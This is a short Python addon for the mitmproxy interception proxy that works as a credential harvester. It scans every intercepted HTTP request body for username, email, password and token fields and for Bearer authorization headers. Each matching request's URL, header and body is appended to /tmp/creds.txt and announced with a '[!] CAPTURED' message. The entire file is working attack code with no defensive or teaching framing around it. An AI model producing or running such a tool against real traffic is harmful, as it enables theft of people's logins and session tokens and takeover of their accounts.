from mitmproxy import http
import datetime, re

LOGFILE = "/tmp/creds.txt"

def request(flow: http.HTTPFlow) -> None:
    url = flow.request.pretty_url
    body = flow.request.get_text(strict=False) or ""
    
    if re.search(r'\.(png|jpg|jpeg|gif|css|js|svg|woff|woff2)(\?|$)', url):
        return
    
    hits = re.findall(
        r'(?:username|user|email|login|account|pass|pwd|password|passwd|token|auth)["\']?\s*[:=]\s*["\']?([^"\'&\s]{3,})',
        body, re.IGNORECASE
    )
    
    auth = flow.request.headers.get("authorization", "")
    
    if len(hits) >= 2 or auth.startswith("Bearer"):
        ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(LOGFILE, "a") as f:
            f.write(f"\n=== {ts} ===\nURL: {url}\nAUTH: {auth or 'none'}\nBODY: {body[:2000]}\n")
        print(f"[!] CAPTURED: {url}")

def response(flow: http.HTTPFlow) -> None:
    pass
